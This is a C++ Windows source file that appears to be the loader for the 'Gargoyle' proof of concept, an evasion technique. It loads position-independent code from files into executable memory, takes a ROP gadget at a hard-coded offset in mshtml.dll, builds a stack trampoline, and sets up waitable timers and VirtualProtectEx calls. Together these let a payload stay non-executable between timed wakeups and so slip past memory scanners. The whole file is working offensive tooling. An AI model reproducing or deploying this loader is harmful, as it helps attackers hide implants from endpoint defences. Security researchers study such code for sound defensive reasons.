#include <vector>
#include <tuple>
#include <fstream>
#include "Windows.h"
#include <psapi.h>

using namespace std;

namespace {
  typedef void(*callable)(void*);
  constexpr DWORD invocation_interval_ms = 5 * 1000;
  constexpr size_t stack_size = 0x10000;

  struct SetupConfiguration {
    uint32_t initialized;
    void* setup_address;
    uint32_t setup_length;
    void* VirtualProtectEx;
    void* WaitForSingleObjectEx;
    void* CreateWaitableTimer;
    void* SetWaitableTimer;
    void* MessageBox;
    void* tramp_addr;
    void* sleep_handle;
    uint32_t interval;
    void* target;
    uint8_t shadow[8];
  };

  struct StackTrampoline {
    void* VirtualProtectEx;
    void* return_address;
    void* current_process;
    void* address;
    uint32_t size;
    uint32_t protections;
    void* old_protections_ptr;
    uint32_t old_protections;
    void* setup_config;
  };

  struct Workspace {
    SetupConfiguration config;
    uint8_t stack[stack_size];
    StackTrampoline tramp;
  };
}

Workspace& allocate_workspace() {
  auto result = VirtualAllocEx(GetCurrentProcess(), nullptr, sizeof(Workspace), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!result) throw runtime_error("[-] Couldn't VirtualAllocEx: " + GetLastError());
  RtlSecureZeroMemory(result, sizeof(Workspace));
  return *static_cast<Workspace*>(result);
}

tuple<void*, size_t> allocate_pic(const string& filename) {
  fstream file_stream{ filename, fstream::in | fstream::ate | fstream::binary };
  if (!file_stream) throw runtime_error("[-] Couldn't open " + filename);
  auto pic_size = static_cast<size_t>(file_stream.tellg());
  file_stream.seekg(0, fstream::beg);
  auto pic = VirtualAllocEx(GetCurrentProcess(), nullptr, pic_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  if (!pic) throw runtime_error("[-] Couldn't VirtualAllocEx: " + GetLastError());
  file_stream.read(static_cast<char*>(pic), pic_size);
  file_stream.close();
  DWORD old_protection;
  auto prot_result = VirtualProtectEx(GetCurrentProcess(), pic, pic_size, PAGE_EXECUTE_READ, &old_protection);
  if (!prot_result) throw runtime_error("[-] Couldn't VirtualProtectEx: " + GetLastError());
  return { pic, pic_size };
}

void* get_gadget(bool use_mshtml, const string& gadget_pic_path) {
  if (use_mshtml) {
    printf("[ ] Loading mshtml.dll.\n");
    auto mshtml_base = reinterpret_cast<uint8_t*>(LoadLibraryA("mshtml.dll"));
    printf("[+] Loaded mshtml.dll into memory at 0x%p.\n", mshtml_base);
    return mshtml_base + 7165405;
  } else {
    printf("[ ] Allocating memory for %s.\n", gadget_pic_path.c_str());
    void* memory; size_t size;
    tie(memory, size) = allocate_pic(gadget_pic_path);
    printf("[ ] Allocated %u bytes for gadget PIC.\n", size);
    return memory;
  }
}

void launch(const string& setup_pic_path, const string& gadget_pic_path) {
  printf("[ ] Allocating executable memory for %s.\n", setup_pic_path.c_str());
  void* setup_memory; size_t setup_size;
  tie(setup_memory, setup_size) = allocate_pic(setup_pic_path);
  printf("[+] Allocated %d bytes for PIC.\n", setup_size);

  auto use_mshtml{ true };
  printf("[ ] Configuring ROP gadget.\n");
  auto gadget_memory = get_gadget(use_mshtml, gadget_pic_path);
  printf("[+] ROP gadget configured.\n");

  printf("[ ] Allocating read/write memory for config, stack, and trampoline.\n");
  auto& scratch_memory = allocate_workspace();
  auto& config = scratch_memory.config;
  auto& tramp = scratch_memory.tramp;
  printf("[+] Allocated %u bytes for scratch memory.\n", sizeof(scratch_memory));

  printf("[ ] Building stack trampoline.\n");
  tramp.old_protections_ptr = &tramp.old_protections;
  tramp.protections = PAGE_EXECUTE_READ;
  tramp.current_process = GetCurrentProcess();
  tramp.VirtualProtectEx = VirtualProtectEx;
  tramp.size = static_cast<uint32_t>(setup_size);
  tramp.address = setup_memory;
  tramp.return_address = setup_memory;
  tramp.setup_config = &config;
  printf("[+] Stack trampoline built.\n");

  printf("[ ] Building configuration.\n");
  config.setup_address = setup_memory;
  config.setup_length = static_cast<uint32_t>(setup_size);
  config.VirtualProtectEx = VirtualProtectEx;
  config.WaitForSingleObjectEx = WaitForSingleObjectEx;
  config.CreateWaitableTimer = CreateWaitableTimerW;
  config.SetWaitableTimer = SetWaitableTimer;
  config.MessageBox = MessageBox;
  config.tramp_addr = &tramp;
  config.interval = invocation_interval_ms;
  config.target = gadget_memory;
  printf("[+] Configuration built.\n");

  printf("[+] Success!\n");
  printf("    ================================\n");
  printf("    Gargoyle PIC @ -----> 0x%p\n", setup_memory);
  printf("    ROP gadget @ -------> 0x%p\n", gadget_memory);
  printf("    Configuration @ ----> 0x%p\n", &scratch_memory.config);
  printf("    Top of stack @ -----> 0x%p\n", &scratch_memory.stack);
  printf("    Bottom of stack @ --> 0x%p\n", &scratch_memory.stack[stack_size-1]);
  printf("    Stack trampoline @ -> 0x%p\n", &scratch_memory.tramp);

  reinterpret_cast<callable>(setup_memory)(&config);
}

int main() {
  try {
    launch("setup.pic", "gadget.pic");
  } catch (exception& e) {
    printf("%s\n", e.what());
  }
}
